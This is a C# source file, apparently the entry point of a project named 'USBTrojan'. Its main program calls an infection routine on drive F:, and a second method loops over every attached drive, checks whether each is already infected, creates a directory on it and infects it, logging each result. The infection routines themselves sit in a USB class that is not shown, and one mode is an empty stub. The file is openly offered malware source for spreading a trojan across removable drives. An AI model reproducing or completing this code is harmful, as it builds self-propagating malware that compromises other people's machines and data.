using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace USBTrojan
{
    class Program
    {
        static void Main(string[] args)
        {
            //USB.CreateHomeDirectory("F:\\");
            USB.Infect("F:\\");
            Console.ReadLine();
        }
        
        static void BaseMode()
        {
            string[] drives = USB.GetDrives();
            foreach (string drive in drives)
            {
                if (!USB.IsInfected(drive))
                {
                    Console.WriteLine("new uninfected drive: {0}", drive);
                    if (USB.CreateHomeDirectory(drive))
                    {
                        Console.WriteLine("infecting {0}", drive);
                        if (USB.Infect(drive)) Console.WriteLine("{0} successful infected", drive);
                        else Console.WriteLine("{0} - fail", drive);
                    }
                    else
                    {
                        Console.WriteLine("{0} is RO or system", drive);
                    }
                }
                else
                {
                    Console.WriteLine("{0} already infected", drive);
                }
                Console.WriteLine();
            }
        }

        static void USBMode()
        {

        }
    }
}
